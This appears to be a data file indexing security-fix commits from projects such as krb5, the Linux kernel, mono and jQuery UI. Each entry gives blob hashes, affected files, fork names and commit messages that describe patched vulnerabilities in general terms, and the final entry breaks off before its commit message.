Commit With Fix: 
    cf1a0c411b2668c57c41e9c4efd15ba17b6b322c
File(s) In Commit: 
    src/kadmin/server/schpw.c
Blob(s) In Commit: 
    7f455d8640fe443660abaa4dd1897da27222e4e0
Blob(s) Before Fix: 
    15b0ab5a38da4ac72a98f2e4d40a0096b39e3c1f
Projects:
    3van_krb5
Commit Message for cf1a0c411b2668c57c41e9c4efd15ba17b6b322c:
Fix kpasswd UDP ping-pong [CVE-2002-2443]\n\nThe kpasswd service provided by kadmind was vulnerable to a UDP "ping-pong" attack [CVE-2002-2443].  Don't respond to packets unless they pass some basic validation, and don't respond to our own error packets.\n\nSome authors use CVE-1999-0103 to refer to the kpasswd UDP ping-pong attack or UDP ping-pong attacks in general, but there is discussion leading toward narrowing the definition of CVE-1999-0103 to the echo, chargen, or other similar built-in inetd services.\n\nThanks to Vincent Danen for alerting us to this issue.\n\nCVSSv2: AV:N/AC:L/Au:N/C:N/I:N/A:P/E:P/RL:O/RC:C\n\nticket: 7637 (new) target_version: 1.11.3 tags: pullup

======================================================================
Commit With Fix: 
    6c4841c2b6c32a134f9f36e5e08857138cc12b10
File(s) In Commit: 
    arch/powerpc/kernel/traps.c
Blob(s) In Commit: 
    5ed4c2ceb5caa8632c11f229193afe0596893650
Blob(s) Before Fix: 
    9b352bd0a46011714482b1b9daaa2216f5e421e9
    d9f10f2fc372b2ebde2bb24dbbb82267383295d7
Projects:
    0-T-0_ps4-linux
    007shadowfighter_rails
    0day-ci_xen
Commit Message for 6c4841c2b6c32a134f9f36e5e08857138cc12b10:
[POWERPC] Never panic when taking altivec exceptions from userspace\n\nAt the moment we rely on a cpu feature bit or a firmware property to detect altivec. If we dont have either of these and the cpu does in fact support altivec we can cause a panic from userspace.\n\nIt seems safer to always send a signal if we manage to get an 0xf20 exception from userspace.\n\nSigned-off-by: Anton Blanchard <anton@samba.org> Signed-off-by: Paul Mackerras <paulus@samba.org>

======================================================================
Commit With Fix: 
    0b29669c065f60501e7289e1950fa2a618962358
File(s) In Commit: 
    drivers/media/video/videobuf-vmalloc.c
Blob(s) In Commit: 
    e01259438bb2755bd8bf284554675145282086aa
Blob(s) Before Fix: 
    cd74341c984fd0cd37678c955e5689b2b55697ea
Projects:
    0-T-0_ps4-linux
    007shadowfighter_rails
    0day-ci_xen
Commit Message for 0b29669c065f60501e7289e1950fa2a618962358:
V4L/DVB (6751): V4L: Memory leak!  Fix count in videobuf-vmalloc mmap\n\nThis is pretty serious bug.  map->count is never initialized after the call to kmalloc making the count start at some random trash value.  The end result is leaking videobufs.\n\nAlso, fix up the debug statements to print unsigned values.\n\nPushed to http://ifup.org/hg/v4l-dvb too\n\nSigned-off-by: Brandon Philips <bphilips@suse.de> Signed-off-by: Mauro Carvalho Chehab <mchehab@infradead.org>

======================================================================
Commit With Fix: 
    8beacc646acb67c995aea10ac5585970efc7355a
File(s) In Commit: 
    README.md
Blob(s) In Commit: 
    6f45a78d720c5175043436204c471ef0e33f5b30
Blob(s) Before Fix: 
    4eeecaf3c1bed12b4e1017e0a1439ef9130ac581
Projects:
    01i_PHPMailer
Commit Message for 8beacc646acb67c995aea10ac5585970efc7355a:
Add security notices

======================================================================
Commit With Fix: 
    124d3b7041f9a0ca7c43a6293e1cae4576c32fd5
File(s) In Commit: 
    mm/filemap.c
Blob(s) In Commit: 
    76bea88cbebcb6201d87574890f476ff0051caee
Blob(s) Before Fix: 
    5209e47b7fe39dba855e84ee9ca4d89283fd3d80
    89ce6fe5f8be152e71218085af5396dcb72d315c
    f4d0cded0e10aa21b02707fcaf99c4cbcafa4f06
Projects:
    0-T-0_ps4-linux
    007shadowfighter_rails
    0day-ci_xen
Commit Message for 124d3b7041f9a0ca7c43a6293e1cae4576c32fd5:
fix writev regression: pan hanging unkillable and un-straceable\n\nFrederik Himpe reported an unkillable and un-straceable pan process.\n\nZero length iovecs can go into an infinite loop in writev, because the iovec iterator does not always advance over them.\n\nThe sequence required to trigger this is not trivial. I think it requires that a zero-length iovec be followed by a non-zero-length iovec which causes a pagefault in the atomic usercopy. This causes the writev code to drop back into single-segment copy mode, which then tries to copy the 0 bytes of the zero-length iovec  a zero length copy looks like a failure though, so it loops.\n\nPut a test into iov_iter_advance to catch zero-length iovecs. We could just put the test in the fallback path, but I feel it is more robust to skip over zero-length iovecs throughout the code (iovec iterator may be used in filesystems too, so it should be robust).\n\nSigned-off-by: Nick Piggin <npiggin@suse.de> Signed-off-by: Ingo Molnar <mingo@elte.hu> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    aba6681660f65af7f1676434da68c10298c30200
File(s) In Commit: 
    src/java/org/orbeon/oxf/xml/xerces/XercesSAXParserFactoryImpl.java
Blob(s) In Commit: 
    fc0d716f4145caea42b2b2f118b01cfea6258783
Blob(s) Before Fix: 
    c4c59e48b0819824e4ef3e387f0b36970d99ec72
Projects:
    3etechinns_orbeon-forms
Commit Message for aba6681660f65af7f1676434da68c10298c30200:
Implemented "[ #315668 ] Disable loading of external entities in XML parsing by default".

======================================================================
Commit With Fix: 
    8e890a3bf80a4620e417814dc14886b1bbd17625
File(s) In Commit: 
    mono/metadata/loader.c
Blob(s) In Commit: 
    db126b8d096260cc708d172c500fe153e3ec7fac
Blob(s) Before Fix: 
    4e9a1520805d7b1fc99297083d85d62e953da9f8
    77095835bf00f5c6cc43b97dae24b37b9c5ab3f5
Projects:
    004307ec_mono
Commit Message for 8e890a3bf80a4620e417814dc14886b1bbd17625:
Search for dllimported shared libs in the base directory, not cwd.\n\n* loader.c: we don't search the current directory anymore for shared libraries referenced in DllImport attributes, as it has a slight security risk. We search in the same directory where the referencing image was loaded from, instead. Fixes bug# 641915.

======================================================================
Commit With Fix: 
    a2ae4cc9a16e211c8a128ba10d22a85431f093ab
File(s) In Commit: 
    fs/notify/inotify/inotify_user.c
Blob(s) In Commit: 
    4cd5d5d78f9fa2b85f38bd9422efc3d387780295
Blob(s) Before Fix: 
    0c6bbc031f15a2677be351ef4a9fa4eab3edfbf8
    122878a4b1da01d8621ff0a206e0368b869edf7d
    1634319e2404d2a02de2aa2de2b9ffea0559e5c5
    22ef16a478a002e2c103e35d619cc1c42e076745
    24edc1185d53fd1b2a0d61e646d02f4bd7fc0afb
    444c305a468c531b7e9e8dda803a2d650a257c58
    472cdf29ef82598586a52f32c405bc43a8ab6b26
    5b7c6fe7fb61b25929f4cf6bb20f6328ecafc750
    5ef5f365a5c86acb32813e7ff9b11d713f54f21b
    72f8825526084e6dfafc3a351311f898e7ee873f
    8271cf05c9577856e427fcd8046be33497ba9265
    8445fbc8985cae9c7357f59f97fface6e482815b
    a94e8bd8eb1f8274372940271970e0506ac3df50
    bf7f6d776c31a22e71573ef86e00516c195e95e6
    dcd2040d330c4397d8cfdaa78a9c27dd990fe9ad
    e0f7c1241a6adb60e03034bb118586407a24e37c
    e46ca685b9be39fc5f1f59ae5d6c6309d60aa644
    ff231ad23895ea179a5507ace2e4ca5c54db1470
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for a2ae4cc9a16e211c8a128ba10d22a85431f093ab:
inotify: stop kernel memory leak on file creation failure\n\nIf inotify_init is unable to allocate a new file for the new inotify group we leak the new group.  This patch drops the reference on the group on file allocation failure.\n\nReported-by: Vegard Nossum <vegard.nossum@gmail.com> cc: stable@kernel.org Signed-off-by: Eric Paris <eparis@redhat.com>

======================================================================
Commit With Fix: 
    0a54917c3fc295cb61f3fb52373c173fd3b69f48
File(s) In Commit: 
    drivers/net/wireless/orinoco/wext.c
Blob(s) In Commit: 
    e5afabee60d1834b898193479cf710c3bb3eed22
Blob(s) Before Fix: 
    31ca241f775351a7129ff3007c1eea0f6e621b0d
    3b5508f982e80b8376d6bcb20c63dae6fd5586e0
    3f081423439248535cbc3f8bf06a4c3f8c680853
    56aab61fd4cbaffc95ad08c0428e97400667a720
    5775124e2aeefd57215324cb1c778ad983f8b024
    7698fdd6a3a23e721550a73215e05d15d1ef04a5
    77b2d7b63bebb90d2bda5a6a5a6bd3079b421a21
    93505f93bf97711019e86bbe27f39f4f727bce01
    bbb9beb206b1b9e8e590fa28c9d0e1dacca39670
    cf7be1eb612495b699dc2e0cdc8fe17650c26736
    e793679e2e190c9321d863512e0756fbaa17713b
    fbcc6e1a2e1d55f9631304e1f4562db55118bb01
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 0a54917c3fc295cb61f3fb52373c173fd3b69f48:
orinoco: fix TKIP countermeasure behaviour\n\nEnable the port when disabling countermeasures, and disable it on enabling countermeasures.\n\nThis bug causes the response of the system to certain attacks to be ineffective.\n\nIt also prevents wpa_supplicant from getting scan results, as wpa_supplicant disables countermeasures on startup - preventing the hardware from scanning.\n\nwpa_supplicant works with ap_mode=2 despite this bug because the commit handler re-enables the port.\n\nThe log tends to look like:\n\nState: DISCONNECTED -> SCANNING Starting AP scan for wildcard SSID Scan requested (ret=0) - scan timeout 5 seconds EAPOL: disable timer tick EAPOL: Supplicant port status: Unauthorized Scan timeout - try to get results Failed to get scan results Failed to get scan results - try scanning again Setting scan request: 1 sec 0 usec Starting AP scan for wildcard SSID Scan requested (ret=-1) - scan timeout 5 seconds Failed to initiate AP scan.\n\nReported by: Giacomo Comes <comes@naic.edu> Signed-off by: David Kilroy <kilroyd@googlemail.com> Cc: stable@kernel.org Signed-off-by: John W. Linville <linville@tuxdriver.com>

======================================================================
Commit With Fix: 
    7572777eef78ebdee1ecb7c258c0ef94d35bad16
File(s) In Commit: 
    fs/fuse/file.c
Blob(s) In Commit: 
    8b984a2cebbda185af01a6d4d5f8c31c89fc6fbe
Blob(s) Before Fix: 
    06f30e965676e00d9b781eaf9d666686c2a3f214
    0e2e25b114a63e256de21d7fbdb69d74c774e9dd
    147c1f71bdb9f0213307fd3e63f6e3b30fc3f403
    14a183a8351e4ca418c5c9bfba0570c4464f7b78
    6c2717d421e8b9fd2d1b62ffb7a1a47a04da97d8
    9242d294fe90d382fb7a40f1220923baea71c97e
    9e0832dbb1e3dfb8e0872273fc53800f60a9251d
    a9f5e137f1d31547f86bbfdb87df11c07daf963f
    ada0adeb3bb581a7a9dad2f1378201d3031d917c
    c18913a777ae3865148c9bbd679d0c09ff092f4f
    c8224587123f6e2ff84c8933f8d56a50ffd06c80
    d480d9af46c964f8b86ced68feb7e787959a4fdb
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 7572777eef78ebdee1ecb7c258c0ef94d35bad16:
fuse: verify ioctl retries\n\nVerify that the total length of the iovec returned in FUSE_IOCTL_RETRY doesn't overflow iov_length().\n\nSigned-off-by: Miklos Szeredi <mszeredi@suse.cz> CC: Tejun Heo <tj@kernel.org> CC: <stable@kernel.org>         [2.6.31+]

======================================================================
Commit With Fix: 
    c3bb41f727fbe00e5de719d687757b24c8dcdfc8
File(s) In Commit: 
    chef-server-api/app/controllers/users.rb
Blob(s) In Commit: 
    a336f04f03f0f0cfe470f1a21e09c9499b7c30b7
Blob(s) Before Fix: 
    494039fd5effe3a9b10a189ab5847ff67a9bd4d9
    752866b092414cd618a76266f0e0de8a0321d217
    cef22c5a340b685bc3c63fc34709ca5aa0779c0a
Projects:
    17601606252_chef
Commit Message for c3bb41f727fbe00e5de719d687757b24c8dcdfc8:
CHEF-1289 API does not check for admin rights for user management

======================================================================
Commit With Fix: 
    7e9060c109b928769a664dbcc2c17bd21231b6f3
File(s) In Commit: 
    ui/jquery.ui.dialog.js
Blob(s) In Commit: 
    808d31d5b2b7c319a034af2440013ac676d7fd2f
Blob(s) Before Fix: 
    07c5c7cb6afd12b938205cc0b99afcf40a18c9a7
    5eb3e2aca824de2b34d05026265789afda431c41
Projects:
    0-wiz-0_jquery-ui
Commit Message for 7e9060c109b928769a664dbcc2c17bd21231b6f3:
Dialog: Extract setting the title into a _title method, use .text() to prevent XSS. Fixes #6016 - Dialog: Title XSS Vulnerability.

======================================================================
Commit With Fix: 
    fc3a9157d3148ab91039c75423da8ef97be3e105
File(s) In Commit: 
    arch/x86/kvm/x86.c
Blob(s) In Commit: 
    8b4d5fc080125071e53325f658efeaabd159f44d
Blob(s) Before Fix: 
    47e5a41cc40e5f554bd73dc03c8e0e332c5a5772
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for fc3a9157d3148ab91039c75423da8ef97be3e105:
KVM: X86: Don't report L2 emulation failures to user-space\n\nThis patch prevents that emulation failures which result from emulating an instruction for an L2-Guest results in being reported to userspace. Without this patch a malicious L2-Guest would be able to kill the L1 by triggering a race-condition between an vmexit and the instruction emulator. With this patch the L2 will most likely only kill itself in this situation.\n\nSigned-off-by: Joerg Roedel <joerg.roedel@amd.com> Signed-off-by: Marcelo Tosatti <mtosatti@redhat.com>

======================================================================
Commit With Fix: 
    867c20265459d30a01b021a9c1e81fb4c5832aa9
File(s) In Commit: 
    security/integrity/ima/ima_policy.c
Blob(s) In Commit: 
    d661afbe474c2fce8f74907869be0a644c5789c9
Blob(s) Before Fix: 
    1a9583008aaef1bf1fe6868f921408ac83d06a63
    399433ad614e0d26cc05588014991632a80865b0
    40a7488f6721b15a70ea0677dce5e10503b9e7b8
    4759d0f99335c5d8e06d44fa4993f4b65f061bb8
    6cfa154a6705e11e8d715faf0d98088b6553f3ff
    8643a93c5963b174853140ef9e90d23e145141cc
    a9c3d3cd1990d506a431614ffcf1d63ee53434a3
    aef8c0a923ab8e2276f97e1fe2aa61b7748e25e4
    b5291ad5ef563b4a5707f0dc6b926fd2aafdf997
    d45061d02feec0d8b3e55f356d81df41580ad506
    d8edff209bf3b2bfc4373fa15ef17d25b30b86ed
    e1278399b34546a8ba5bbb4e8fdb90f9a8ec009f
    e504ba7df0b873aa6cb258c38e5bf36d30332163
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 867c20265459d30a01b021a9c1e81fb4c5832aa9:
ima: fix add LSM rule bug\n\nIf security_filter_rule_init() doesn't return a rule, then not everything is as fine as the return code implies.\n\nThis bug only occurs when the LSM (eg. SELinux) is disabled at runtime.\n\nAdding an empty LSM rule causes ima_match_rules() to always succeed, ignoring any remaining rules.\n\n default IMA TCB policy:   # PROC_SUPER_MAGIC   dont_measure fsmagic=0x9fa0   # SYSFS_MAGIC   dont_measure fsmagic=0x62656572   # DEBUGFS_MAGIC   dont_measure fsmagic=0x64626720   # TMPFS_MAGIC   dont_measure fsmagic=0x01021994   # SECURITYFS_MAGIC   dont_measure fsmagic=0x73636673\n\n  < LSM specific rule >   dont_measure obj_type=var_log_t\n\n  measure func=BPRM_CHECK   measure func=FILE_MMAP mask=MAY_EXEC   measure func=FILE_CHECK mask=MAY_READ uid=0\n\nThus without the patch, with the boot parameters 'tcb selinux=0', adding the above 'dont_measure obj_type=var_log_t' rule to the default IMA TCB measurement policy, would result in nothing being measured.  The patch prevents the default TCB policy from being replaced.\n\nSigned-off-by: Mimi Zohar <zohar@us.ibm.com> Cc: James Morris <jmorris@namei.org> Acked-by: Serge Hallyn <serge.hallyn@canonical.com> Cc: David Safford <safford@watson.ibm.com> Cc: <stable@kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    3ef52043861ab16352d49af89e048ba6339d6df8
File(s) In Commit: 
    nbd-server.c
Blob(s) In Commit: 
    b47da867a828a6220fda1dfdb6126801618a056f
Blob(s) Before Fix: 
    820458cb0f8e9d4f2bf5bd49a872956623903034
Projects:
    363921219_nbd
Commit Message for 3ef52043861ab16352d49af89e048ba6339d6df8:
Fix buffer size checking\n\nYes, this means we've re-introduced CVE-2005-3534. Sigh.

======================================================================
Commit With Fix: 
    6b0d6a9b4296fa16a28d10d416db7a770fc03287
File(s) In Commit: 
    net/bridge/br_multicast.c
Blob(s) In Commit: 
    fdbd41c76ec45273155d9a99c67a655bc33e8ec6
Blob(s) Before Fix: 
    f701a21acb340108f51627ebd10d60b634d0a946
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 6b0d6a9b4296fa16a28d10d416db7a770fc03287:
bridge: Fix mglist corruption that leads to memory corruption\n\nThe list mp->mglist is used to indicate whether a multicast group is active on the bridge interface itself as opposed to one of the constituent interfaces in the bridge.\n\nUnfortunately the operation that adds the mp->mglist node to the list neglected to check whether it has already been added.  This leads to list corruption in the form of nodes pointing to itself.\n\nNormally this would be quite obvious as it would cause an infinite loop when walking the list.  However, as this list is never actually walked (which means that we don't really need it, I'll get rid of it in a subsequent patch), this instead is hidden until we perform a delete operation on the affected nodes.\n\nAs the same node may now be pointed to by more than one node, the delete operations can then cause modification of freed memory.\n\nThis was observed in practice to cause corruption in 512-byte slabs, most commonly leading to crashes in jbd2.\n\nThanks to Josef Bacik for pointing me in the right direction.\n\nReported-by: Ian Page Hands <ihands@redhat.com> Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    035c8587c0d8d307e45f1b7171a0d337bb451f1e
File(s) In Commit: 
    mono/metadata/icall.c
Blob(s) In Commit: 
    b75791231e2ac7f9e298bc78d7fa5b4ef2dad832
Blob(s) Before Fix: 
    ec2daf57444777203a2b98e0326d96c10d71a6ce
Projects:
    004307ec_mono
Commit Message for 035c8587c0d8d307e45f1b7171a0d337bb451f1e:
Allow only primitive types/enums in RuntimeHelpers.InitializeArray ().

======================================================================
Commit With Fix: 
    2f00e4bbb2137130845afb1b2a1e678552fc8e5c
File(s) In Commit: 
    mono/metadata/icall.c
Blob(s) In Commit: 
    6e20125f471a4396ebfc6d11edf93916f0338f30
Blob(s) Before Fix: 
    b75791231e2ac7f9e298bc78d7fa5b4ef2dad832
Projects:
    004307ec_mono
Commit Message for 2f00e4bbb2137130845afb1b2a1e678552fc8e5c:
Disable some of the FastCopy fast paths since they are racy.

======================================================================
Commit With Fix: 
    722f9890f09aadfc37ae479e7d946d5fc5ef7b91
File(s) In Commit: 
    mono/metadata/threads.c
Blob(s) In Commit: 
    a7a721dca8509d2a6670cdacf482e8e3c4493948
Blob(s) Before Fix: 
    3fe4e9302bb4bb6ba369e50a4c66b0adb6e2f516
Projects:
    0-T-0_ps4-linux
    004307ec_mono
Commit Message for 722f9890f09aadfc37ae479e7d946d5fc5ef7b91:
Fix access to freed members of a dead thread\n\n* threads.c: Fix access to freed members of a dead thread. Found and fixed by Rodrigo Kumpera <rkumpera@novell.com> Ref: CVE-2011-0992

======================================================================
Commit With Fix: 
    2338cd19ed7a7f4c1e94f639ab2789d6586d01f3
File(s) In Commit: 
    lib/RT/Scrips_Overlay.pm
Blob(s) In Commit: 
    1d30702577689cd6452b186a378b2ceaf6029037
Blob(s) Before Fix: 
    df24b3cff2e2b3f7199569150576361aee91b214
Projects:
    2ndQuadrant_rt
Commit Message for 2338cd19ed7a7f4c1e94f639ab2789d6586d01f3:
security fix: clone the ticket to set CurrentUser

======================================================================
Commit With Fix: 
    c4c896e1471aec3b004a693c689f60be3b17ac86
File(s) In Commit: 
    net/bluetooth/sco.c
Blob(s) In Commit: 
    926ed39912ea7e2fd9d601063e0993c85220e226
Blob(s) Before Fix: 
    960c6d1637da0d3ee23cc998e5890b84123f76c9
    d0927d1fdadaba4887dbac40064c4328541b9b00
    ef81d0e2c31caa70015e86c80043e745e7406520
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for c4c896e1471aec3b004a693c689f60be3b17ac86:
Bluetooth: sco: fix information leak to userspace\n\nstruct sco_conninfo has one padding byte in the end.  Local variable cinfo of type sco_conninfo is copied to userspace with this uninizialized one byte, leading to old stack contents leak.\n\nSigned-off-by: Vasiliy Kulikov <segoon@openwall.com> Signed-off-by: Gustavo F. Padovan <padovan@profusion.mobi>

======================================================================
Commit With Fix: 
    43629f8f5ea32a998d06d1bb41eefa0e821ff573
File(s) In Commit: 
    net/bluetooth/bnep/sock.c
Blob(s) In Commit: 
    d935da71ab3b57ff7c46962f339b257f39e57952
Blob(s) Before Fix: 
    10292e77604612f371e0e26d9b59d446f4897b34
    17800b1d28ea33c4d3b36801cdc1092a2930b88f
    2862f53b66b15b8b680322b32c5196f502adc7f0
    2ff6ac7b2ed494b8ffcac277d0e067b92d408734
    392a53714c7d41e79470e67b834e28bcebc58c61
    e857628b0b27e61234102dc843ab0cc84a5f5c42
    efc85dc9d8c34c886adbfa6ebe111c1658b6c604
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 43629f8f5ea32a998d06d1bb41eefa0e821ff573:
Bluetooth: bnep: fix buffer overflow\n\nStruct ca is copied from userspace.  It is not checked whether the "device" field is NULL terminated.  This potentially leads to BUG() inside of alloc_netdev_mqs() and/or information leak by creating a device with a name made of contents of kernel stack.\n\nSigned-off-by: Vasiliy Kulikov <segoon@openwall.com> Signed-off-by: Gustavo F. Padovan <padovan@profusion.mobi>

======================================================================
Commit With Fix: 
    d846f71195d57b0bbb143382647c2c6638b04c5a
File(s) In Commit: 
    net/bridge/netfilter/ebtables.c
Blob(s) In Commit: 
    893669caa8de6c56960f804da8d2125f07823fb3
Blob(s) Before Fix: 
    16df0532d4b9a7d5ff41c3f1e1df889d204128a0
    47acf4a50efe8f6a6ebde4657ff82da743ca270b
    59ca00e40dec2401b483bad4a7799775766e9f0d
    5f1825df9dcad7cb546ae7b4b8182210cd60d7a5
    a1dcf83f0d5860743906f75bcae5a23477c9b098
    bcc102e3be4daa2c5f09ee27710cc5ed03b096fa
    bd1c65425d4fc02e4b514711a2ee951a122c99fb
    f0865fd1e3eca770f2218e576093a139b9676243
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for d846f71195d57b0bbb143382647c2c6638b04c5a:
bridge: netfilter: fix information leak\n\nStruct tmp is copied from userspace.  It is not checked whether the "name" field is NULL terminated.  This may lead to buffer overflow and passing contents of kernel stack as a module name to try_then_request_module() and, consequently, to modprobe commandline.  It would be seen by all userspace processes.\n\nSigned-off-by: Vasiliy Kulikov <segoon@openwall.com> Signed-off-by: Patrick McHardy <kaber@trash.net>

======================================================================
Commit With Fix: 
    1309d7afbed112f0e8e90be9af975550caa0076b
File(s) In Commit: 
    drivers/char/tpm/tpm.c
Blob(s) In Commit: 
    7beb0e25f1e1e2ca192ae563eb43f6dc0147f8f8
Blob(s) Before Fix: 
    05ad4a17a28f238ecc197e67051f60a50faad769
    068c816e69423bb0065100f4599310907eb08bc9
    1f46f1cd9225c3c0d2a894bc80d3d1e74fe012e7
    2df6c26bbf578f77bf3889e6d7c04ce00b023388
    36e0fa161c2bf0b46206a6e0af00698935ad158b
    47c2d276345665bb6e1c46ff2386d002e87853bc
    4c95699c9fb6b9f016b4ec693a31a1dbd32160b1
    59bc7c7b200225440cfbe081f5ae392afca1e15a
    65b9d6f99437d233952be2ec6b4a3ddbe50b3156
    7c4133582dbae484f449d49f97b2ee0f179a9891
    9bb542913b864f44631665e8fb8e2496cef8eff5
    a0789f682e14d214ab75abc61bcf4694f88054df
    b85ee76e4b425887bcdb7540aba4fec9b6e5fc49
    edd7b7f3b26bd2774f05145941b60ec00c48013e
    f06bb37defb12d300eec4c7f5de67efa3d59b9f8
    faf5a2c659262aeea3d419142b78d32deac721a9
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 1309d7afbed112f0e8e90be9af975550caa0076b:
char/tpm: Fix unitialized usage of data buffer\n\nThis patch fixes information leakage to the userspace by initializing the data buffer to zero.\n\nReported-by: Peter Huewe <huewe.external@infineon.com> Signed-off-by: Peter Huewe <huewe.external@infineon.com> Signed-off-by: Marcel Selhorst <m.selhorst@sirrix.com> [ Also removed the silly "* sizeof(u8)".  If that isn't 1, we have way   deeper problems than a simple multiplication can fix.   - Linus ] Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    d370af0ef7951188daeb15bae75db7ba57c67846
File(s) In Commit: 
    net/irda/iriap.c
Blob(s) In Commit: 
    36477538cea8eba501f000253b433d673b8d579f
Blob(s) Before Fix: 
    013f6f99a02c9aeb526a56c73ab6a6b47a1c4fd5
    16b2253511982fabe83d768f738ff5be6547911e
    294e34d3517cb87cc191c1cfec9d7b39de30245d
    35a338b6d897c7ee1c71f00ddf8d0fb67116bedd
    5b743bdd89ba26a3a30b1110de67cea27636f047
    79a1e5a23e10e6e0aa1b14837bdfbe29cf7d7000
    e71e85ba2bf1c180b2038d62021283ddf7982b07
    f876eed7d4aad3099869acad4670e102e1bf368e
    fce364c6c71a5e612fb9f0c2c65b0166749821af
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for d370af0ef7951188daeb15bae75db7ba57c67846:
irda: validate peer name and attribute lengths\n\nLength fields provided by a peer for names and attributes may be longer than the destination array sizes.  Validate lengths to prevent stack buffer overflows.\n\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com> Cc: stable@kernel.org Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    da48524eb20662618854bb3df2db01fc65f3070c
File(s) In Commit: 
    kernel/signal.c
Blob(s) In Commit: 
    31751868de8856cbe4ee909ef09915e6a9a9c679
Blob(s) Before Fix: 
    4e3cff10fdceda165e8e9f22c0e9b861dba918d8
    6705320784fd2b07a518c4d2bb47520d0b342aa8
    825a3f24ad760d88018f21710a882a2b8fe36cb0
    bded65187780f5f288bd779920a5c04c190528dc
    d09692b4037614cf8a596ec229002018ebee9aac
    dbd7fe073c558dbc57080e7d0d9344b2cf47b2dd
    dd72567767d963ccb8ac2f3cfa4a824fa5f81b4e
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for da48524eb20662618854bb3df2db01fc65f3070c:
Prevent rt_sigqueueinfo and rt_tgsigqueueinfo from spoofing the signal code\n\nUserland should be able to trust the pid and uid of the sender of a signal if the si_code is SI_TKILL.\n\nUnfortunately, the kernel has historically allowed sigqueueinfo() to send any si_code at all (as long as it was negative - to distinguish it from kernel-generated signals like SIGILL etc), so it could spoof a SI_TKILL with incorrect siginfo values.\n\nHappily, it looks like glibc has always set si_code to the appropriate SI_QUEUE, so there are probably no actual user code that ever uses anything but the appropriate SI_QUEUE flag.\n\nSo just tighten the check for si_code (we used to allow any negative value), and add a (one-time) warning in case there are binaries out there that might depend on using other si_code values.\n\nSigned-off-by: Julien Tinnes <jln@google.com> Acked-by: Oleg Nesterov <oleg@redhat.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    4d00135a680727f6c3be78f8befaac009030e4df
File(s) In Commit: 
    sound/oss/opl3.c
Blob(s) In Commit: 
    407cd677950bccb68059fdcd1abec6da914b7a38
Blob(s) Before Fix: 
    3a67bcdd6722f87fa0ff1c198417bd3ad1de95c9
    4709e592e2ccccf854d8edc2b43304662573fbfa
    4e912dd3b35e5bcffc2aaabe4c4b3b419e10dfbf
    551e7e62e529f91dd91577036a4affa332a1a423
    607cee4d545ec675cdfebb91ec6802b4555c71fa
    69d0511e64c0e51bc345741972145d036a7d9af1
    7781c13c147635b53b06756e31b0daae50b583c0
    938c48c43585ea88fa0be036b0765e24f3221ff0
    a31734b7842fc9bff2cd0aab50292578c0966bed
    b6d19adf8f4111d575c88b235142d6ed0580654f
    bb39fbc89f75efad75982c32ff85ed42b6e96d9a
    be0c3695a8b44f8a10c175c5080d17644c8fd4fd
    c5c24409ceb065b49d8f7bb05d010085e4588d47
    c914e7430b755e8d414243c1f0de6bd396b95d91
    cbf957424d5c3d45328c9867598ac83e2d554f52
    cc9ce47312c09c2e96fac62a055b37aaf3d106e0
    cfb96db82fb5e55540137cafef982e4c6941f1aa
    f4ffdff9b245173295e4a28bf1c8be4e0e76f4ad
    fc273e55094480db93f3ad351c4e6aea49137c28
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 4d00135a680727f6c3be78f8befaac009030e4df:
sound/oss/opl3: validate voice and channel indexes\n\nUser-controllable indexes for voice and channel values may cause reading and writing beyond the bounds of their respective arrays, leading to potentially exploitable memory corruption.  Validate these indexes.\n\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com> Cc: stable@kernel.org Signed-off-by: Takashi Iwai <tiwai@suse.de>

======================================================================
Commit With Fix: 
    be20250c13f88375345ad99950190685eda51eb8
File(s) In Commit: 
    net/rose/rose_subr.c
Blob(s) In Commit: 
    174d51c9ce37774f1a046ff49f0157d265e1a5bb
Blob(s) Before Fix: 
    1734abba26a29bf1a9d156747b97d0d8c5f1fe84
    f6c71caa94b9d8b7fe2d7873264929218af2a97c
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for be20250c13f88375345ad99950190685eda51eb8:
ROSE: prevent heap corruption with bad facilities\n\nWhen parsing the FAC_NATIONAL_DIGIS facilities field, it's possible for a remote host to provide more digipeaters than expected, resulting in heap corruption.  Check against ROSE_MAX_DIGIS to prevent overflows, and abort facilities parsing on failure.\n\nAdditionally, when parsing the FAC_CCITT_DEST_NSAP and FAC_CCITT_SRC_NSAP facilities fields, a remote host can provide a length of less than 10, resulting in an underflow in a memcpy size, causing a kernel panic due to massive heap corruption.  A length of greater than 20 results in a stack overflow of the callsign array.  Abort facilities parsing on these invalid length values.\n\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com> Cc: stable@kernel.org Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    4ce00aef84d1ff7c35f7adbbb99a6241cfda00cc
File(s) In Commit: 
    src/gl-auth-command
Blob(s) In Commit: 
    f3449a59ff658c7078b16d9c674d118f45e1a230
Blob(s) Before Fix: 
    02a4be7737d2829c1c48773ea8e15504ab119aa6
    1af4232f0b0104f0228c9ef0f4858cc441ede95e
Projects:
    1060460048_gitolite
